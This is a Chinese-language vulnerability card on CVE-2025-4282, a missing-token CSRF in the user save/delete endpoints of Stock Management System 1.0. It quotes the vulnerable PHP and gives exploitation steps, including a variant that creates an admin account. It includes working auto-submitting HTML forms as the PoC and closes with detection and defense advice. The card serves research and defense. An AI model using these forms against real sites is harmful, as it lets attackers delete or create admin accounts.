---
id: web-generic-csrf-sourcecodester-stock-users-save-delete
title: Stock Management System 1.0 Users.php?f=save/delete 无 CSRF Token：管理员访问恶意页即被增删用户（CVE-2025-4282）
type: scenario
domain: web
path: web/generic/csrf
technique: php-no-token-users-save-delete-csrf
tags:
- php
- csrf
- missing-token
- user-management
- sourcecodester
- stock-management
- cve-2025-4282
cve:
- CVE-2025-4282
severity: medium
confidence: high
affected_versions: 1.0（原文受影响版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:06:34+08:00'
  notes: 已对照原文及32张图核对：图33 Users.php 的 save_users() 使用 extract($_POST)，无 csrf_token/Origin/Referer 校验；图34 POST /classes/Users.php?f=delete 仅 id=11 即返回 {"status":"success"}；图35 用户列表 2 条，图36 CSRF PoC 页面，图37 删除后 1 条，跨站删除已打通。注意：卡内 save_users 的 INSERT/UPDATE 片段为原文简写，实际代码先按 firstname/middlename/lastname/username/type 白名单拼 $data 再写入，但仍无 Token，CSRF 结论不变。受影响版本 V1.0 为原文明确标注，已保留。PoC 未在本机执行。
url: /docs/web/generic/csrf/web-generic-csrf-sourcecodester-stock-users-save-delete/
draft: false
kb_aliases:
- CVE-2025-4282
- Stock Management System CSRF
- Users.php f=delete CSRF
- 无 Token 增删用户
- extract($_POST) CSRF
---

## 一句话结论

Stock Management System 1.0 的 `/classes/Users.php?f=save`、`?f=delete` 通过 `extract($_POST)` 接收参数，既不校验 CSRF Token 也不校验 Origin/Referer；已登录管理员只要访问攻击者页面，浏览器就会带着会话自动向 `f=delete` 提交 `id=11`，直接删除指定用户；`f=save` 同样可被伪造以创建或修改用户。

## 原理

- 删除逻辑：
  ```php
  public function delete_users(){
      extract($_POST);
      $avatar = $this->conn->query("SELECT avatar FROM users where id = '{$id}'")->fetch_array()['avatar'];
      $qry = $this->conn->query("DELETE FROM users where id = $id");
      ...
  }
  ```
  代码直接用 `$_POST['id']` 删除用户及其头像文件，没有 `csrf_token` 校验、没有确认口令、没有来源校验。攻击者构造一个自动提交的 HTML 表单即可完成跨站请求。
- 保存逻辑 `save_users()` 同样 `extract($_POST)` 后用 `INSERT INTO users set {$data}` 或 `UPDATE users set $data where id = {$id}` 写入，没有 Token；攻击者可伪造创建/修改用户，若修改管理员邮箱/口令字段可进一步接管。
- CSRF 成立依赖浏览器在跨站请求中携带管理员的 `PHPSESSID`；原文在测试环境用 Burp 生成的 PoC 页面点击后成功删除用户（用户列表从 2 条变为 1 条），说明目标会话 Cookie 未做有效 SameSite 隔离或测试浏览器未拦截。
- 原文同时指出代码 1（delete）与代码 2（save）都缺少 Token，危害从“删除任意用户”扩展到“创建/修改用户”。

## 触发条件

- 目标为 Stock Management System 1.0。
- 受害者是已登录管理员，且会话 Cookie 会在跨站 POST 中发送（未设置 `SameSite=Strict/Lax` 或浏览器策略允许）。
- 攻击者能让管理员访问恶意页面（钓鱼、论坛、IM 链接等）。
- `/classes/Users.php?f=delete`（或 `f=save`）无需额外 Token/确认口令，直接接受 POST。

## 利用步骤

1. 以管理员身份抓取删除用户的请求，确认 URL 为 `/classes/Users.php?f=delete`、参数仅 `id=11`、无 Token。
2. 构造自动提交的 CSRF 页面：
   ```html
   <html><body onload="document.forms[0].submit()">
   <form action="http://target/classes/Users.php?f=delete" method="POST">
     <input type="hidden" name="id" value="11" />
   </form>
   </body></html>
   ```
3. 将页面托管给已登录管理员访问；浏览器携带其会话提交请求，服务端返回 `{"status":"success"}`，用户被删除。
4. 变体：把 action 改为 `f=save`，提交 `username`、`password`、`type=1` 等字段创建管理员账号，或提交 `id` 修改现有用户。
5. 验证：用户列表数量变化 / 新账号可登录。

## PoC

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://sms-test.com/classes/Users.php?f=delete" method="POST">
      <input type="hidden" name="id" value="11" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

服务端响应：

```json
{"status":"success"}
```

## 变体与关联

- 变体：`f=save` 伪造创建/修改用户；若可写 `type`/`password` 字段，可直接创建管理员或重置他人口令。
- 变体：把 GET 型后台操作（如删除、状态变更）做成 `<img src=...>` 触发；本产品删除接口为 POST，需自动提交表单。
- 关联：[[web-generic-csrf]] 下其他无 Token 后台操作卡；[[web-generic-auth-zentao-file-delete-idor]]（同为后台删除缺少授权，但本卡是跨站伪造而非对象级越权）。

## 检测与防御

- 检测：后台用户管理请求缺少 `csrf_token`；来自外部 Origin/Referer 的 POST；管理员访问后紧接 `Users.php?f=delete`/`f=save` 的异常请求。
- 防御：所有状态变更接口加 CSRF Token 并在服务端用 `hash_equals` 校验；同时校验 `Origin`/`Referer`。
- 防御：会话 Cookie 设置 `SameSite=Lax/Strict`、`Secure`、`HttpOnly`；敏感操作要求二次确认或重新输入口令。
- 防御：删除/创建用户等管理操作使用 POST + 权限校验 + 审计日志；不要依赖前端隐藏入口。
